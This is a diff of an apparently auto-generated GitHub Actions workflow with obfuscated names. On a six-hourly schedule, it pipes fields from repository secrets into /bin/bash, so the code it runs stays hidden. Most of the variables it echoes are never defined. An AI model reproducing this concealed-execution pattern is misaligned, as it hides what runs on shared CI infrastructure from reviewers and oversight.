@@ -1,23 +1,32 @@
 name: songjunnu2109
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 5/6 * * *'
+    - cron: '18 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: songjunnu2109
         env:
-          hbz6693: ${{ secrets.hbz6693 }}
+          ro5: ${{ secrets.ro5 }}
         run: |
-          echo $hbz6693 | jq -r .heexl9261 | /bin/bash
-          echo $r080 | jq -r .sy5 | /bin/bash
-          echo $huz9074 | jq -r .tpi4368 | /bin/bash
-          echo $xlav3 | jq -r .ipoqx2405 | /bin/bash
-          echo $pz4 | jq -r .q1 | /bin/bash
-          echo $pmfqp3409 | jq -r .meraa9377 | /bin/bash
-          echo $mcpx8234 | jq -r .olaa94562 | /bin/bash
+          echo $ro5 | jq -r .pz1 | /bin/bash
+          echo $tlo14 | jq -r .pm13655 | /bin/bash
+          echo $mlag0 | jq -r .qlr9 | /bin/bash
+          echo $u2234 | jq -r .jxs7 | /bin/bash
+          echo $nlxfy6 | jq -r .tl762 | /bin/bash
+          echo $dfyw2488 | jq -r .jakoe27 | /bin/bash
+          echo $vt80 | jq -r .dwzo14983 | /bin/bash
+          echo $zqmm97 | jq -r .vp02 | /bin/bash
+          echo $wk4496 | jq -r .hl3931 | /bin/bash
+          echo $jn64 | jq -r .elsd9707 | /bin/bash
+          echo $bm60648 | jq -r .omuu553 | /bin/bash
+          echo $yvdz0 | jq -r .z2998 | /bin/bash
+          echo $dxvw8199 | jq -r .a4493 | /bin/bash
+          echo $iniri67947 | jq -r .isywm030 | /bin/bash
 
